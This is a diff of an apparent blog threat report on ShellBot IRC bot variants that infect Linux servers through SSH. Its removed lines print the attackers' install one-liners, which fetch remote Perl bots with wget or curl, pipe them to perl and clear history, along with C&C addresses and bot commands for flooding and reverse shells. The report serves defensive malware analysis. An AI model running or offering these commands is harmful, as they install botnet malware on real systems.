@@ -50,18 +50,7 @@ Zenbox Linux
 
 “LiGhT’s Modded perlbotv2” is being used by a variety of threat actors. The following commands are used in the ShellBot installation after the SSH server has been successfully logged into.
 
-Filename: ak
-Installation Command: wget -qO – x-x-x[.]online/ak|perl
-
-Filename: perl
-Installation Command: nproc; nvidia-smi –list-gpus ;cd /tmp;wget -qO – http://34.225[.]57.146/futai/perl|perl;rm -rf perl
-
-Filename: mperl
-Installation Command: cd /tmp ; wget 193.233.202[.]219/mperl ; perl mperl ; rm -rf mperl
-
-Filename: niko2
-Installation Command: cd /tmp ; wget 193.233.202[.]219/niko1 ; perl niko1 ; rm -rf niko1
-
+<img width="472" alt="Screen Shot 2023-06-01 at 1 50 31 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/912a9c94-b4b1-4f94-88f9-a476e1bd90a1">
 
 Commands used to install LiGhT’s Modded perlbot v2:
 Configuration data such as the C&C server and the name of the channel to join are included in the initial routine of ShellBot. A nickname with the format “IP-[5 random digits]” is used to join the IRC channels.
@@ -70,21 +59,7 @@ Configuration data such as the C&C server and the name of the channel to join ar
 
 Configuration data for ShellBot:
 
-Filename: ak
-C&C URL: 164.90.240[.]68:6667
-Channel Name: #nou
-Filename: per
-
-C&C URL: 164.132.224[.]207:80
-Channel Name: #mailbomb
-Filename: mperl
-
-C&C URL: 206.189.139[.]152:6667
-Channel Name: #Q
-Filename: niko1
-
-C&C URL: 176.123.2[.]3:6667
-Channel Name: #X
+<img width="67" alt="Screen Shot 2023-06-01 at 1 28 45 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/407723d3-c921-4b05-b47f-18f858718242">
 
 C&C URL and channels of LiGhT’s Modded perlbot v2:
 The “LiGhT’s Modded perlbot v2” version of ShellBot offers various features which are largely categorized in the table below. Commands that can actually be used for malicious purposes include DDoS commands such as TCP, UDP, and HTTP Flooding. It also includes a variety of commands that allows control over infected systems so that they can be used in other attacks such as reverse shell, log deletion, and scanner.
@@ -97,39 +72,20 @@ Aside from “LiGhT’s Modded perlbot v2”, “DDoS PBot v2.0” is also being
 
 <img width="784" alt="Screen Shot 2023-06-01 at 1 22 31 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/9ac4e293-e5e5-4f27-aab3-a7f30cf539cc">
 
-Initial routine of DDoS PBot v2.0:
-The following are commands used to install “DDoS PBot v2.0”.
-
-Filename
-Installation Command
-bash
-wget -qO – 80.94.92[.]241/bash|perl
-test.jpg
-uname -a;wget -q -O- hxxp://185.161.208[.]234/test.jpg|perl;curl -sS hxxp://185.161.208[.]234/test.jpg|perl;nproc;history -c
-dred
-uname -a;lspci | grep -i –color ‘vga|3d|2d’;curl -s -L hxxp://39.165.53[.]17:8088/iposzz/dred -o /tmp/dred;perl /tmp/dred
-
 
 Commands used to install DDoS PBot v2.0:
 
+<img width="687" alt="Screen Shot 2023-06-01 at 1 53 56 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/cf674814-5802-453f-933e-cea17c0cc065">
+
+
 “DDoS PBot v2.0” randomly chooses a nickname from a selection of over 500, which include “abbore”, “ably”, and “abyss”, before joining an IRC channel.
 
-List of DDoS PBot v2.0 nicknames:
-Filename
-C&C URL
-Channel Name
-bash
-51.195.42[.]59:8080
-#sex
-test.jpg
-gsm.ftp[.]sh:1080
-#test
-dred
-192.3.141[.]163:6667
-#bigfalus
+<img width="641" alt="Screen Shot 2023-06-01 at 2 12 22 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/59658e55-2633-4a9e-b524-e7fa03e476a1">
 
 C&C URL and channels of DDoS PBot v2.0:
 Additionally, regular IRC Bots receive commands from the threat actor via the IRC channels to perform malicious acts. Thus, there is a need to verify the threat actor sending commands. Without a verification process, any users can join the channel and control the bots however they want.
+
+<img width="479" alt="Screen Shot 2023-06-01 at 2 13 53 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/373447a1-c690-4318-ab6b-282ebd80a94d">
 
 In order to do this, the IRC Bot has to perform an additional task where users that have joined the channel must verify their nickname and host address before they can enter a command. For example, in the case of the “bash” malware, the nickname must be either “crond,” “drugs,” or “tab” as defined in the “admins” variable, while the host address must be “localhost” as defined in the “hostauth” variable.
 
@@ -138,73 +94,31 @@ In order to do this, the IRC Bot has to perform an additional task where users t
 Configuration data of DDoS PBot v2.0
 Like regular ShellBots, “DDoS PBot v2.0” also offers a variety of malicious commands including DDoS attack commands.
 
-Command (Category)
-Description
-system
-Infected, system information output
-version,
-Version information output,
-channel
-IRC control commands
-flood,
-DDoS commands,
+<img width="520" alt="Screen Shot 2023-06-01 at 2 00 37 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/9a3edbff-3d1e-4a08-a2fb-855f17891f82">
 
-TCP, UDP, HTTP, SQL Flooding,utils
-Attack commands,
-
-Port Scan, Reverse Shell, file download, etc.
-Features supported by DDoS PBot v2.0
 
 3.3. PowerBots (C) GohacK
 The main characteristic of PowerBots is that it has a simpler form in comparison to the ShellBot types covered above.
 
 Configuration data of PowerBots:
 
-Filename:ff
-Installation Command:
-
-uname -a ;wget -qO – hxxp://80.68.196[.]6/ff|perl &>>/dev/null
-
-
-
-Command used to install PowerBots:
-Filename:ff
-
-Channel Name:#x
-
-C&C URL:49.212.234[.]206:3303
+<img width="691" alt="Screen Shot 2023-06-01 at 2 18 43 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/f8ce2514-268d-4f49-88c1-9451b46fb3a8">
 
 
 C&C URL and channel of DDoS PBot v2.0
 ShellBot types usually offer a variety of DDoS attack features, but since PowerBots mainly focuses on its reverse shell and file downloading capabilities, it is likely that the threat actor installed ShellBot as a backdoor.
 
-Command
-Description
+<img width="475" alt="Screen Shot 2023-06-01 at 2 22 26 PM" src="https://github.com/EnyelSalas/Blog-Portfolio/assets/115824437/6d1b60a9-17a6-45d5-8a7b-97857759d0ca">
 
+In conclusion, the report highlights the importance of maintaining strong security practices to prevent unauthorized access to servers. Organizations must implement the recommended mitigation strategies to prevent such attacks. By taking these measures, organizations can protect themselves from the damaging effects of malware such as ShellBot and its variants.
 
+Researches by: 
+Enyel Salas, Jr Analyst.
 
+References:
+ASEC
+AhnLab-V3
 
-Command
-Description
-
-
-
-Command :ps
-Description: Port scanning
-Command:namp
-Description: NMAP port scanning
-
-NMAP port scanning
-rm
-Delete files in a particular path
-version
-Version information output
-down
-File download
-udp
-UDP Flooding attack
-back
-Reverse Shell
 
 
 
